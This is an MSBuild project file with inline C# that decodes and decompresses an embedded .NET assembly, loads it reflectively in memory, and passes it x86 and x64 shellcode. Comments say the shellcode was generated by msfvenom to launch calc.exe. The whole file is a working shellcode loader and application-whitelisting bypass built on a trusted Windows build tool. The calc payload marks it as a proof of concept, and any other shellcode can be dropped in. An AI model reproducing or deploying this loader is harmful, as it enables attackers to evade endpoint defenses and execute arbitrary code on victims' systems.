<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Sample"><Sample /></Target>
  <UsingTask
    TaskName="Sample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task><Code Type="Class" Language="cs"><![CDATA[

using System;
using System.Reflection;
using System.IO;
using System.IO.Compression;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;


public class Sample : Microsoft.Build.Utilities.Task, Microsoft.Build.Framework.ITask {

    private static string encoded_compressed_dll = @"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";
    
    // msfvenom -p windows/exec CMD=calc.exe -f raw | base64
    private static String x86_shellcode = @"
        /OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjj
        SAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sE
        iwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD7
        4HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==";

    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64
    private static String x64_shellcode = @"
        /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHB
        yQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHW
        TTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFY
        QVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//V
        u/C1olZBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYy5leGUA";

    private static byte[] decode_decompress_dll(string ecdll)
    {
        byte[] compressed_dll = System.Convert.FromBase64String(ecdll);
        System.IO.MemoryStream memstream = new System.IO.MemoryStream(compressed_dll.Length);
        System.IO.MemoryStream msptr = new System.IO.MemoryStream();
        memstream.Write(compressed_dll, 0, compressed_dll.Length);
        memstream.Seek(0, System.IO.SeekOrigin.Begin);
        using (System.IO.Compression.DeflateStream innocent = new System.IO.Compression.DeflateStream(memstream, System.IO.Compression.CompressionMode.Decompress))
        {
            byte[] block = new byte[4096];
            int nbytes;
            while ((nbytes = innocent.Read(block, 0, block.Length)) != 0)
                msptr.Write(block, 0, nbytes);
        }
        return msptr.ToArray();
    }

    public override bool Execute()
    {
        System.Reflection.Assembly loaded_assembly = System.Reflection.Assembly.Load(
            decode_decompress_dll(encoded_compressed_dll)
        );
        System.Type astype = loaded_assembly.GetType("Example2");
        object class_instance = System.Activator.CreateInstance(astype, null);
        System.Reflection.MethodInfo entrypoint = astype.GetMethod("Run");
        entrypoint.Invoke(class_instance, new object[] { x86_shellcode, x64_shellcode });
        return true;
    }
}

      ]]></Code>
    </Task>
  </UsingTask>
</Project>

